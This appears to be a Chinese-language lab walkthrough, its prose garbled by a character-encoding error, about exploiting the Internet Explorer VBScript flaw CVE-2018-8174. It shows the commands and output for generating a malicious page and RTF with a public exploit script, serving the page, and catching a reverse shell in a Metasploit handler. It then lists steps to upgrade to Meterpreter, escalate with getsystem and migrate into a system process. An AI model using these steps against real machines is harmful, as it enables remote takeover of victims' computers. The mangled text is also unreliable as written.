å°±æ˜¯è½¯ä»¶æˆ–è€…å…¶ä»–ä¸œè¥¿å‘å¸ƒä¹‹å24å°æ—¶å†…å°±å‡ºç°æ¼æ´äº†å°±æ˜¯0dayæ¼æ´ 
ç°åœ¨å¼•ç”³åˆ°è½¯ä»¶å‘è¡Œåå¾ˆçŸ­æ—¶é—´å†…å°±å‘ç°æ¼æ´éƒ½å«0dayæ¼æ´
æ¯”å¦‚IEæµè§ˆå™¨ä¸€ç›´æœ‰é—®é¢˜ åæ¥2018å¹´4æœˆ20æ—¥æ‰å‘ç°
æ‰€ä»¥åœ¨è¿™ä¸ªæœŸé—´çš„windowsç”µè„‘éƒ½å‡ ä¹éƒ½å¯ä»¥è¢«åˆ©ç”¨

è¿™ä¸ªexpæ˜¯ç”¨python2å†™çš„å’±ç”¨python2å¼„
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# unzip CVE-2018-8174_EXP-master.zip 
Archive:  CVE-2018-8174_EXP-master.zip
d055e4d56920f10303f9a8879c8eb47e22abb01d
   creating: CVE-2018-8174_EXP-master/
  inflating: CVE-2018-8174_EXP-master/CVE-2018-8174.py  
  inflating: CVE-2018-8174_EXP-master/README.md  
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd CVE-2018-8174_EXP-master

â”Œâ”€â”€(rootğŸ’€tyza66)-[~/CVE-2018-8174_EXP-master]
â””â”€# python2 CVE-2018-8174.py -u http://192.168.101.53/exploit.html -o hack.rtf -i 192.168.101.53 -p 4444
UNICODE_URL len 134 , need to pad ...
Generated hack.rtf successfully
!!! Completed !!!

python2 CVE-2018-8174.py -u http://192.168.101.53/exploit.html -o hack.rtf -i 192.168.101.53 -p 4444   
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/CVE-2018-8174_EXP-master]
â””â”€# ls
CVE-2018-8174.py  exploit.html  hack.rtf  README.md
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/CVE-2018-8174_EXP-master]
â””â”€# cp exploit.html /var/www/html


ç„¶åå’±ä»¬å…ˆå¼€å¯ç›‘å¬
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/CVE-2018-8174_EXP-master]
â””â”€# msfdb run
[i] Database already started
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.101.53
LHOST => 192.168.101.53
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 

ä¹‹åå»æ—§ç‰ˆç³»ç»Ÿæ‰“å¼€æ—§ç‰ˆie
192.168.101.53/exploit.html

å‘ç°è·å¾—äº†ç»ˆç«¯
ä¹‹åæˆ‘ä»¬å°è¯•å°†æ™®é€šçš„shellç»ˆç«¯æå‡åˆ°meterpreter
sessions -u id
ä¹‹åä¼šé‡æ–°å»ºç«‹ä¸€ä¸ªè¿æ¥
ä¹‹åå°è¯•ææƒ
å°è¯•ä½¿ç”¨getsystemææƒåˆ°systemæƒé™
è¿˜å¯ä»¥æ‰¾ä¸€ä¸ªsystemè¿è¡Œçš„è¿›ç¨‹è¿›è¡Œè¿ç§»
getpid èƒ½è·å¾—å½“å‰id
ps
migrate pid

æ‰€ä»¥å°±èƒ½æ‹¿åˆ°shell ä¹‹åå°±å¯ä»¥æå‡æƒé™
          

